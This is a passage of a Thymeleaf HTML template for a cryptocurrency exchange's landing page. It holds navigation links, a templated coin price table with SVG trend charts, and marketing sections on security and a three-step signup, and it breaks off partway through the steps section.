<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title th:text="${site_title}"></title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="npm/swiper%409/swiper-bundle.min.css">
    <link rel="stylesheet" href="landings/4/css/normalize.css">
    <link rel="stylesheet" href="landings/4/css/global.css">
    <link rel="stylesheet" href="landings/4/css/header.css">
    <link rel="stylesheet" href="landings/4/css/intro.css">
    <link rel="stylesheet" href="landings/4/css/rated.css">
    <link rel="stylesheet" href="landings/4/css/gateway.css">
    <link rel="stylesheet" href="landings/4/css/protect.css">
    <link rel="stylesheet" href="landings/4/css/steps.css">
    <link rel="stylesheet" href="landings/4/css/trade.css">
    <link rel="stylesheet" href="landings/4/css/instantly.css">
    <link rel="stylesheet" href="landings/4/css/reliable.css">
    <link rel="stylesheet" href="landings/4/css/advanced.css">
    <link rel="stylesheet" href="landings/4/css/footer.css">
    <link rel="stylesheet" href="landings/4/css/benefits.css">
    <link rel="stylesheet" href="assets/css/language-select.css">
    <link rel="icon" th:href="${site_icon}">
    <link rel="shortcut icon" th:href="${site_icon}">
</head>
<body>
<div class="global__wrapper">
    <header class="header">
        <div class="header__container">
            <div class="header__global-wrapper">
                <a class="header__logo" href="index_4">
                    <img style="width: 30px; height: auto; margin-right: 10px" th:src="${site_icon}" alt="">
                    <th:block th:text="${site_name}"></th:block>
                </a>
                <div class="header__wrapper">
                    <div class="header__center">
                        <a class="header__link" href="profile/trading" th:text="#{trading}"></a>
                        <a class="header__link" href="profile/p2p">P2P</a>
                        <a class="header__link" href="profile/staking" th:text="#{staking}"></a>
                        <a class="header__link" href="profile/wallet" th:text="#{wallet}"></a>
                        <a class="header__link hot" href="profile/swap" th:text="#{swap}"></a>
                    </div>
                    <div class="header__right">
                        <div style="display: flex; justify-content: center; margin-right: 12px">
                            <div th:replace="~{fragments/language-container.html :: container}"></div>
                        </div>
                        <a th:if="${user == null}" class="header__link-log" href="signin">
                            <div style="all: unset" th:text="#{login}"></div>
                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewbox="0 0 13 13" fill="none">
                                <path d="M0.310719 11.2755C-0.0894082 11.6562 -0.105173 12.2892 0.275506 12.6893C0.656186 13.0894 1.28915 13.1052 1.68928 12.7245L0.310719 11.2755ZM12.5106 2.0249C12.5243 1.47278 12.0879 1.01406 11.5358 1.00031L2.53855 0.776217C1.98644 0.762465 1.52771 1.19889 1.51396 1.75101C1.50021 2.30312 1.93664 2.76185 2.48875 2.7756L10.4863 2.97479L10.2871 10.9723C10.2733 11.5244 10.7098 11.9831 11.2619 11.9969C11.814 12.0106 12.2727 11.5742 12.2865 11.0221L12.5106 2.0249ZM1.68928 12.7245L12.2001 2.72449L10.8216 1.2755L0.310719 11.2755L1.68928 12.7245Z" fill="#03FC9E"></path>
                            </svg>
                        </a>
                        <a th:if="${user == null}" class="header__link-up" href="signup">
                            <div style="all: unset" th:text="#{signup}"></div>
                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewbox="0 0 13 13" fill="none">
                                <path d="M0.310719 11.2755C-0.0894082 11.6562 -0.105173 12.2892 0.275506 12.6893C0.656186 13.0894 1.28915 13.1052 1.68928 12.7245L0.310719 11.2755ZM12.5106 2.0249C12.5243 1.47278 12.0879 1.01406 11.5358 1.00031L2.53855 0.776217C1.98644 0.762465 1.52771 1.19889 1.51396 1.75101C1.50021 2.30312 1.93664 2.76185 2.48875 2.7756L10.4863 2.97479L10.2871 10.9723C10.2733 11.5244 10.7098 11.9831 11.2619 11.9969C11.814 12.0106 12.2727 11.5742 12.2865 11.0221L12.5106 2.0249ZM1.68928 12.7245L12.2001 2.72449L10.8216 1.2755L0.310719 11.2755L1.68928 12.7245Z" fill="black"></path>
                            </svg>
                        </a>
                        <a th:if="${user != null}" class="header__link-log" href="profile">
                            <div style="all: unset" th:text="#{profile}"></div>
                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewbox="0 0 13 13" fill="none">
                                <path d="M0.310719 11.2755C-0.0894082 11.6562 -0.105173 12.2892 0.275506 12.6893C0.656186 13.0894 1.28915 13.1052 1.68928 12.7245L0.310719 11.2755ZM12.5106 2.0249C12.5243 1.47278 12.0879 1.01406 11.5358 1.00031L2.53855 0.776217C1.98644 0.762465 1.52771 1.19889 1.51396 1.75101C1.50021 2.30312 1.93664 2.76185 2.48875 2.7756L10.4863 2.97479L10.2871 10.9723C10.2733 11.5244 10.7098 11.9831 11.2619 11.9969C11.814 12.0106 12.2727 11.5742 12.2865 11.0221L12.5106 2.0249ZM1.68928 12.7245L12.2001 2.72449L10.8216 1.2755L0.310719 11.2755L1.68928 12.7245Z" fill="#03FC9E"></path>
                            </svg>
                        </a>
                    </div>
                </div>
                <div class="header__btn-mobile">
                    <svg width="35" height="35" viewbox="0 0 100 100">
                        <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
                        <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
                        <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
                    </svg>
                </div>
            </div>
        </div>
    </header>
    <section class="intro">
        <div class="container">
            <div class="intro__box">
                <div class="intro__left">
                    <div class="intro__subtitle" th:text="#{index4.welcome(${site_name})}"></div>
                    <div class="intro__title global__title">
                        <span>
                           <div th:text="#{index4.buy.trade}"></div>
                        </span>
                        <div style="all: unset" th:text="#{index4.the.original}"></div>
                    </div>
                    <div class="intro__description global__description" th:text="#{index4.makes.trading(${site_name})}"></div>
                    <a class="intro__link global__link" href="signup" th:text="#{index.get.started}"></a>
                </div>
                <div class="intro__right">
                    <div class="intro__img">
                        <img src="landings/4/img/intro/iPhone%2014%20Pro.png" alt="">
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="rated">
        <div class="container">
            <div class="rated__box">
                <div class="rated__left">
                    <div class="rated__img">
                        <img src="landings/4/img/rated/rated.svg" alt="">
                    </div>
                </div>
                <div class="rated__right">
                    <div class="rated__title global__title">
                        <span>
                           <div th:text="#{index4.rated}"></div>
                        </span>
                        <div style="all: unset" th:text="#{index4.centralized.exchange}"></div>
                    </div>
                    <div class="rated__description global__description" th:text="#{index4.makes.trading(${site_name})}"></div>
                    <a class="rated__link global__link" href="terms" th:text="#{index4.learn.more}"></a>
                </div>
            </div>
        </div>
    </section>
    <section class="gateway">
        <div class="container">
            <div class="gateway__table">
                <div class="gateway__table-container">
                    <div class="gateway__table-names">
                        <div class="gateway__names-label gateway__names-number">#</div>
                        <div class="gateway__names-label gateway__names-name" th:text="#{name}"></div>
                        <div class="gateway__names-label gateway__names-price" th:text="#{price}"></div>
                        <div class="gateway__names-label gateway__names-change" th:text="#{index.change}"></div>
                        <div class="gateway__names-label gateway__names-chart" th:text="#{index4.chart}"></div>
                        <div class="gateway__names-label gateway__names-trade" th:text="#{trade}"></div>
                    </div>
                </div>
                <div class="gateway__table-items">
                    <div class="gateway__table-item" th:each="i : ${#numbers.sequence(0, (coins.size() < 9 ? coins.size() : 9))}">
                        <th:block th:with="coin = ${coins.get(i)}">
                            <div class="gateway__table-number" th:text="${i + 1}"></div>
                            <div class="gateway__table-name">
                                <img style="width: 35px;" th:src="${coin.icon}" alt="">
                                <div>
                                    <th:block th:text="${coin.title}"></th:block> <span th:text="${coin.symbol == 'GRT' ? 'BORG' : coin.symbol}"></span>
                                </div>
                            </div>
                            <div class="gateway__table-price" th:text="'$' + ${coin_service.getWorkerPriceFormatted(worker, coin.symbol)}"></div>
                            <th:block th:with="changePercent = ${coin_service.getWorkerPriceChangePercent(worker, coin.symbol)}">
                                <div class="gateway__table-change" th:classappend="'gateway__table-change-' + ${changePercent >= 0 ? 'plus' : 'minus'}" th:text="${changePercent + '%'}">
                                </div>
                                <div th:if="${changePercent < 0}" class="gateway__table-chart">
                                    <svg width="138" height="45" viewbox="0 0 138 45" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M120.003 19.1752C122.031 19.6999 125.514 24.4936 134.286 40.6264C134.492 41.0052 134.894 41.25 135.325 41.25C135.974 41.25 136.5 41.7762 136.5 42.4254V42.75C136.5 43.5784 135.828 44.25 135 44.25H2.25C1.42157 44.25 0.75 43.5784 0.75 42.75V34.5C0.75 33.6716 1.42157 33 2.25 33H3.6057C4.15665 33 4.66327 32.698 4.92526 32.2133L11.8293 19.4407C11.9415 19.2332 12.1011 19.055 12.2951 18.9207L16.875 15.75L25.2131 9.01541C25.9457 8.42369 27.0359 8.64551 27.4791 9.47644L32.4 18.7031C32.5464 18.9776 32.7745 19.1997 33.0527 19.3388L39.4257 22.5253C39.8639 22.7445 40.3815 22.7357 40.8121 22.502L52.8769 15.9525C53.1208 15.8201 53.3233 15.6226 53.4616 15.382L61.1547 2.00267C61.5568 1.3034 62.4399 1.04731 63.1537 1.423L68.4663 4.21911C68.8088 4.39936 69.0683 4.705 69.1907 5.07215L73.5331 18.0993C73.7373 18.7119 74.3105 19.125 74.9561 19.125H78.1797C78.5471 19.125 78.9017 19.2598 79.1762 19.5039L87.8179 27.1854C88.4115 27.713 89.3135 27.6865 89.8751 27.1249L93.3074 23.6927C93.7892 23.2108 94.5352 23.1143 95.1238 23.4576L102.394 27.6985C102.848 27.9632 103.407 27.9713 103.868 27.7197L119.289 19.3082C119.51 19.188 119.76 19.1123 120.003 19.1752Z" fill="url(#paint0_linear_1_430)"></path>
                                        <path d="M0.75 33H3.60258C4.15518 33 4.66303 32.6962 4.92432 32.2092L12.4681 18.1503C12.6492 17.8129 12.9523 17.5576 13.3155 17.4365L18.0565 15.8562C18.2662 15.7863 18.4579 15.6708 18.6179 15.5182L25.1956 9.23939C25.9138 8.55391 27.0877 8.74257 27.5549 9.61854L32.4 18.7031C32.5464 18.9776 32.7745 19.1997 33.0527 19.3388L39.4257 22.5253C39.8639 22.7445 40.3815 22.7357 40.8121 22.502L52.8769 15.9525C53.1208 15.8201 53.3233 15.6226 53.4616 15.382L61.1547 2.00267C61.5568 1.3034 62.4399 1.04731 63.1537 1.423L68.4663 4.21911C68.8088 4.39936 69.0683 4.705 69.1907 5.07215L73.5331 18.0993C73.7373 18.7119 74.3105 19.125 74.9561 19.125H78.1797C78.5471 19.125 78.9017 19.2598 79.1762 19.5039L87.8179 27.1854C88.4115 27.713 89.3135 27.6865 89.8751 27.1249L93.3073 23.6927C93.7892 23.2108 94.5352 23.1143 95.1238 23.4576L102.316 27.6532C102.811 27.9419 103.427 27.9235 103.904 27.6056L114.375 20.625C123.239 15.4542 123.882 23.3066 133.072 40.4559C133.332 40.9409 133.843 41.25 134.393 41.25H137.625" stroke="#DB5748" stroke-width="2.25"></path>
                                        <defs>
                                            <lineargradient id="paint0_linear_1_430" x1="68.625" y1="0.75" x2="68.625" y2="44.25" gradientunits="userSpaceOnUse">
                                                <stop stop-color="#DB5748" stop-opacity="0.52"></stop>
                                                <stop offset="1" stop-color="#DB5748" stop-opacity="0"></stop>
                                            </lineargradient>
                                        </defs>
                                    </svg>
                                </div>

                                <div th:if="${changePercent >= 0}" class="gateway__table-chart">
                                    <svg width="138" height="45" viewbox="0 0 138 45" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M21.3018 19.6842C18.9302 20.2528 12.8783 25.0823 4.08914 41.1278C3.88203 41.5059 3.48149 41.75 3.05037 41.75C2.40123 41.75 1.875 42.2762 1.875 42.9254V43.25C1.875 44.0784 2.54658 44.75 3.375 44.75H136.125C136.953 44.75 137.625 44.0784 137.625 43.25V35C137.625 34.1716 136.953 33.5 136.125 33.5H134.769C134.218 33.5 133.712 33.198 133.45 32.7133L126.546 19.9407C126.433 19.7332 126.274 19.555 126.08 19.4207L121.5 16.25L113.162 9.51541C112.429 8.92369 111.339 9.14551 110.896 9.97644L105.975 19.2031C105.829 19.4776 105.601 19.6997 105.322 19.8388L98.9493 23.0253C98.5111 23.2445 97.9935 23.2357 97.5629 23.002L85.4981 16.4525C85.2542 16.3201 85.0517 16.1226 84.9134 15.882L77.2203 2.50267C76.8182 1.8034 75.9351 1.54731 75.2213 1.923L69.9087 4.71911C69.5662 4.89936 69.3067 5.205 69.1843 5.57215L64.8419 18.5993C64.6377 19.2119 64.0645 19.625 63.4189 19.625H60.1953C59.8279 19.625 59.4733 19.7598 59.1988 20.0039L50.5571 27.6854C49.9635 28.213 49.0615 28.1865 48.4999 27.6249L45.0676 24.1927C44.5858 23.7108 43.8398 23.6143 43.2512 23.9576L36.0588 28.1532C35.5639 28.4419 34.9477 28.4235 34.4709 28.1056L22.1279 19.8769C21.8815 19.7127 21.5898 19.6151 21.3018 19.6842Z" fill="url(#paint0_linear_1_465)"></path>
                                        <path d="M137.625 33.5H134.772C134.22 33.5 133.712 33.1962 133.451 32.7092L125.907 18.6503C125.726 18.3129 125.423 18.0576 125.059 17.9365L120.319 16.3562C120.109 16.2863 119.917 16.1708 119.757 16.0182L113.179 9.73939C112.461 9.05391 111.287 9.24257 110.82 10.1185L105.975 19.2031C105.829 19.4776 105.601 19.6997 105.322 19.8388L98.9493 23.0253C98.5111 23.2445 97.9935 23.2357 97.5629 23.002L85.4981 16.4525C85.2542 16.3201 85.0517 16.1226 84.9134 15.882L77.2203 2.50267C76.8182 1.8034 75.9351 1.54731 75.2213 1.923L69.9087 4.71911C69.5662 4.89936 69.3067 5.205 69.1843 5.57215L64.8419 18.5993C64.6377 19.2119 64.0645 19.625 63.4189 19.625H60.1953C59.8279 19.625 59.4733 19.7598 59.1988 20.0039L50.5571 27.6854C49.9635 28.213 49.0615 28.1865 48.4999 27.6249L45.0677 24.1927C44.5858 23.7108 43.8398 23.6143 43.2512 23.9576L35.9509 28.2162C35.5136 28.4713 34.9771 28.4885 34.5243 28.2621L17.5667 19.7834C17.3584 19.6792 17.1236 19.6083 16.9005 19.6749C15.1536 20.1963 13.9377 24.9567 5.3053 40.9546C5.04403 41.4388 4.53233 41.75 3.98214 41.75H0.75" stroke="#7EB194" stroke-width="2.25"></path>
                                        <defs>
                                            <lineargradient id="paint0_linear_1_465" x1="69.75" y1="1.25" x2="69.75" y2="44.75" gradientunits="userSpaceOnUse">
                                                <stop stop-color="#224830"></stop>
                                                <stop offset="1" stop-color="#224830" stop-opacity="0"></stop>
                                            </lineargradient>
                                        </defs>
                                    </svg>
                                </div>
                            </th:block>
                            <div class="gateway__table-trade">
                                <a class="gateway__table-trade-link" th:href="'profile/trading?currency=' + ${coin.symbol == 'GRT' ? 'BORG' : coin.symbol}">Trade</a>
                            </div>
                        </th:block>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="protect">
        <div class="container">
            <div class="protect__box">
                <div class="protect__left">
                    <div class="protect__title global__title">
                        <span>
                           <div th:text="#{index4.protect.yourself}"></div>
                        </span>
                        <div style="all: unset" th:text="#{index4.from.scams}"></div>
                    </div>
                    <div class="protect__description global__description" th:text="#{index4.find.everything(${site_name})}"></div>
                    <div class="protect__text">
                        <div class="protect__text-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none">
                                <path d="M6 19.5H18M12 5V17M12 17L15.5 13.5M12 17L8.5 13.5" stroke="#DDDDDE" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                            </svg>
                        </div>
                        <div style="all: unset" th:text="#{index4.art.of.outsmarting}"></div>
                    </div>
                </div>
                <div class="protect__right">
                    <div class="protect__img">
                        <img src="landings/4/img/protect/trap.svg" alt="">
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="benefits">
        <div class="container">
            <div class="benefits__box">
                <div class="benefits__item">
                    <img class="benefits__img" src="landings/4/img/benefits/icon1.png" alt="">
                    <div class="benefits__title" th:text="#{index4.ease.trading}"></div>
                    <div class="benefits__decription">
                        <div class="benefits__text" th:text="#{index4.intuitive.interface}"></div>
                        <div class="benefits__text" th:text="#{index4.instant.deposit}"></div>
                        <div class="benefits__text" th:text="#{index4.cash.out.directly}"></div>
                    </div>
                </div>
                <div class="benefits__item">
                    <img class="benefits__img" src="landings/4/img/benefits/icon2.png" alt="">
                    <div class="benefits__title" th:text="#{index4.security}"></div>
                    <div class="benefits__decription">
                        <div class="benefits__text" th:text="#{index4.safely}"></div>
                        <div class="benefits__text" th:text="#{index4.encrypted.data}"></div>
                        <div class="benefits__text" th:text="#{index4.whitelisting.transaction}"></div>
                    </div>
                </div>
                <div class="benefits__item">
                    <img class="benefits__img" src="landings/4/img/benefits/icon3.svg" alt="">
                    <div class="benefits__title" th:text="#{index4.proven}"></div>
                    <div class="benefits__decription">
                        <div class="benefits__text" th:text="#{index4.saving.customers}"></div>
                        <div class="benefits__text" th:text="#{index4.live.support}"></div>
                        <div class="benefits__text" th:text="#{index4.industry.uptime}"></div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="steps">
        <div class="container">
            <div class="steps__box">
                <div class="steps__left">
                    <div class="steps__title global__title">
                        <span>
                           <div th:text="#{index4.3steps}"></div>
                        </span>
                        <div style="all: unset" th:text="#{index4.to.start}"></div>
                    </div>
                    <div class="steps__description global__description" th:text="#{index4.makes.trading(${site_name})}"></div>
                    <a class="steps__link global__link" href="signup" th:text="#{index.get.started}"></a>
                </div>
                <div class="steps__right">
                    <div class="steps__items">
                        <div class="steps__item">
                            <div class="steps__item-number">
                                1
                            </div>
                            <div class="steps__item-icon">
                                <img src="landings/4/img/steps/register.png" alt="">
                            </div>
                            <div class="steps__item-title" th:text="#{index4.register}"></div>
                            <div class="steps__item-description" th:text="#{index4.choose.right}"></div>
                        </div>
                        <div class="steps__item">
                            <div class="steps__item-number">
                                2
                            </div>
                            <div class="steps__item-icon">
                                <img src="landings/4/img/steps/fund.png" alt="">
                            </div>
                            <div class="steps__item-title" th:text="#{index4.fund}"></div>
                            <div class="steps__item-description" th:text="#{index4.use.debit}"></div>
                        </div>
                        <div class="steps__item">
                            <div class="steps__item-number">
                                3
